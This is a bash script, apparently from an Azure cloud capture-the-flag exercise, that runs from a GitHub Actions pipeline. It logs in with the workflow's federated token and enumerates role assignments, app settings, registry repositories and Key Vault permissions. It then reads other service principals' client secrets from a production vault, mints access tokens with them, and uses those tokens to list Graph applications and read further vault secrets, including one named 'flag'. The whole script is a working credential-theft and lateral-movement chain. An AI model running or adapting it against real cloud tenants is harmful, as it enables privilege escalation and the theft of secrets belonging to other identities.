#!/usr/bin/env bash
set -uo pipefail

TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
ARM_BASE="https://management.azure.com"
RG="rg-tbl-platform-prod-sea"

JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none

ARM=$(az account get-access-token --resource https://management.azure.com --query accessToken -o tsv)
VTOK=$(az account get-access-token --resource https://vault.azure.net --query accessToken -o tsv)

echo "=== STOREFRONT SAMI ROLE ASSIGNMENTS ==="
SAMI_OID="eeab432e-1bf6-400e-b155-a28ce7cafcdb"
curl -sS "$ARM_BASE/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId+eq+'$SAMI_OID'" \
  -H "Authorization: Bearer $ARM" | python3 -c '
import sys,json
d=json.load(sys.stdin)
for r in d.get("value",[]):
    print(f"scope={r[\"properties\"][\"scope\"]} role={r[\"properties\"][\"roleDefinitionId\"].split(\"/\")[-1]} ({r[\"properties\"].get(\"roleDefinitionName\",\"?\")})")
' 2>/dev/null

echo "=== STOREFRONT APP SETTINGS (cicd-deployer reader cannot list, try anyway) ==="
curl -sS -X POST "$ARM_BASE/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2022-03-01" \
  -H "Authorization: Bearer $ARM" -H "Content-Length: 0" | head -c 1000

echo "=== STOREFRONT SITE INFO (identity, linuxFxVersion) ==="
curl -sS "$ARM_BASE/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod?api-version=2022-03-01" \
  -H "Authorization: Bearer $ARM" | python3 -c '
import sys,json
d=json.load(sys.stdin)
p=d.get("properties",{})
ident=d.get("identity",{})
print("linuxFxVersion:", p.get("siteConfig",{}).get("linuxFxVersion",""))
print("identity:", json.dumps(ident))
' 2>/dev/null

echo "=== ACR LOGIN AND LIST REPOS ==="
az acr login -n crtblplatprodx3euoz 2>&1 | head -5
az acr repository list -n crtblplatprodx3euoz -o tsv 2>/dev/null

echo "=== ACR SHOW tebamoto-reporting-api TAGS ==="
az acr repository show-tags -n crtblplatprodx3euoz --repository tebamoto-reporting-api 2>/dev/null

echo "=== ALL ROLE ASSIGNMENTS AT KV-SEC SCOPE ==="
curl -sS "$ARM_BASE/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" \
  -H "Authorization: Bearer $ARM" | python3 -c '
import sys,json
d=json.load(sys.stdin)
for r in d.get("value",[]):
    print(f"oid={r[\"properties\"][\"principalId\"]} role={r[\"properties\"][\"roleDefinitionId\"].split(\"/\")[-1]} scope={r[\"properties\"][\"scope\"]}")
' 2>/dev/null

echo "=== DIRECTORY-AUDIT TOKEN - TRY ALL RESOURCES ==="
DA_CID=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name directory-audit-principal 2>/dev/null | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["appId"])' 2>/dev/null)
DA_SEC=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name directory-audit-principal 2>/dev/null | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["clientSecret"])' 2>/dev/null)
echo "directory-audit appId: $DA_CID"
for scope in "https://management.azure.com/.default" "https://vault.azure.net/.default" "https://graph.microsoft.com/.default"; do
  T=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
    --data-urlencode "client_id=$DA_CID" --data-urlencode "client_secret=$DA_SEC" \
    --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=$scope" \
    | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
  echo "DA scope=$scope len=${#T}"
  if [ "${#T}" -gt 100 ]; then
    if echo "$scope" | grep -q vault; then
      echo "  KV_SEC: $(curl -sS 'https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4' -H "Authorization: Bearer $T" | head -c 300)"
    elif echo "$scope" | grep -q graph; then
      echo "  GRAPH_ME: $(curl -sS 'https://graph.microsoft.com/v1.0/servicePrincipals?$top=5' -H "Authorization: Bearer $T" | head -c 300)"
      echo "  GRAPH_APPS: $(curl -sS 'https://graph.microsoft.com/v1.0/applications?$top=5' -H "Authorization: Bearer $T" | head -c 300)"
    elif echo "$scope" | grep -q management; then
      echo "  ARM_ROLES: $(curl -sS "$ARM_BASE/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" -H "Authorization: Bearer $T" | head -c 500)"
    fi
  fi
done

echo "=== SECRETS-SYNC CAN IT GET SECRET VALUES FROM KV PROD? ==="
SS_CID=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name secrets-sync-principal 2>/dev/null | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["appId"])' 2>/dev/null)
SS_SEC2=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name secrets-sync-principal 2>/dev/null | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["clientSecret"])' 2>/dev/null)
echo "secrets-sync appId: $SS_CID"
SSV=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  --data-urlencode "client_id=$SS_CID" --data-urlencode "client_secret=$SS_SEC2" \
  --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=https://vault.azure.net/.default" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
echo "secrets-sync vault token len=${#SSV}"
if [ "${#SSV}" -gt 100 ]; then
  echo "KV PROD GET flag secret via secrets-sync:"
  curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/flag?api-version=7.4" -H "Authorization: Bearer $SSV" | head -c 300
  echo ""
  for secret in cost-reader-principal directory-audit-principal reporting-service-principal; do
    echo "GET $secret:"
    curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$secret?api-version=7.4" -H "Authorization: Bearer $SSV" | head -c 200
    echo ""
  done
fi

echo "DONE"
